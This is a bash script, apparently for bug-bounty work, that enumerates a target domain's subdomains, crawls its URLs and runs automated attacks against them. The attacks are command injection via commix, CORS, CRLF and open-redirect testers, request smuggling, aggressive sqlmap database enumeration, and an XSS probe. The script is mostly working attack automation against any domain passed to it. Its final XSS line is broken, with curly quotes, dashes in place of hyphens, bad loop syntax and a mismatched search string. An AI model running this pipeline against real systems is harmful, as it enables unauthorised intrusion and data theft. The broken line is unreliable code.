#!/bin/bash
domain=$1
cd;
cd /home/ubuntu/tools/Sudomy;
sudo ./sudomy -d "$domain" -b -dP -eP -rS -cF -pS -tO -gW --httpx --dnsprobe  -aI webanalyze ;
cd output;
date_stamp=$(date +"%m-%d-%Y");
cd "$date_stamp";
cd "$domain";
echo "$domain">>subdomain.txt ;
#crawling
cat subdomain.txt | waybackurls | tee -a waybackfile.txt ;
cat subdomain.txt | gau>>gaufile.txt ;
cat httprobe_subdomain.txt | gospider -d 5 | anew gospiderstart.txt ;
cat gospiderstart.txt | grep 200 | sed -e 's/\[[^]]*\]//g' | sed 's/-//g' | sed -e 's/^[ \t]*//' | anew gospider200.txt;
cat gospiderstart.txt | grep 403 | sed -e 's/\[[^]]*\]//g' | sed 's/-//g' | sed -e 's/^[ \t]*//' | anew gospider403.txt;
cat gospiderstart.txt | grep 301 | sed -e 's/\[[^]]*\]//g' | sed 's/-//g' | sed -e 's/^[ \t]*//' | anew gospider301.txt;
cat waybackfile.txt>>allcrawldatafile1.txt ;
cat gaufile.txt>>allcrawldatafile1.txt ;
cat gospider200.txt>>allcrawldatafile1.txt ;
cat gospider403.txt>>allcrawldatafile1.txt ;
cat gospider301.txt>>allcrawldatafile1.txt ;

#body discovery
#cat allcrawldatafile1.txt | fff -d 5 -S -o bodydiscovery;
#status code httpx
cat allcrawldatafile1.txt | httpx -status-code -o httpxstatus.txt ;
cat httpxstatus.txt | grep 200 | sed 's/\[[^]]*\]//g' | anew httpxstatus200.txt ;
cat httpxstatus.txt | grep 403 | sed 's/\[[^]]*\]//g' | anew httpxstatus403.txt ;
cat httpxstatus.txt | grep 301 | sed 's/\[[^]]*\]//g' | anew httpxstatus301.txt ;
#command injection
python /home/ubuntu/tools/commix/commix.py -m allcrawldatafile1.txt --level 2 --batch ;
#cors misconfigrations
python3 /home/ubuntu/tools/CORStest/corstest.py subdomain.txt | anew corsmisconfigration.txt ;
# crlf injection
python3 /home/ubuntu/tools/Injectus/Injectus.py -f allcrawldatafile1.txt -w 100 | anew crlfinjection.txt ;
#open redirect
python3 /home/ubuntu/tools/Oralyzer/oralyzer.py -l allcrawldatafile1.txt ;
#http request smuggling 
cat httpxstatus200.txt | python3 /home/ubuntu/tools/smuggler/smuggler.py | anew smugglerfile.txt ;
python3 /home/ubuntu/tools/h2csmuggler/h2csmuggler.py --scan-list httpxstatus200.txt --threads 10 | anew h2smuggler.txt ;
#sqlinjection
cat allcrawldatafile1.txt | grep '=' | sqlmap --risk=3 --level=5 --batch --threads=8 -dbs | anew sqlmapfile.txt ;
#xss
cat allcrawldatafile1.txt | grep = | qsreplace ‘<hello123>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<hell0123>” && echo “$host”;done | anew trydalfox.txt ;



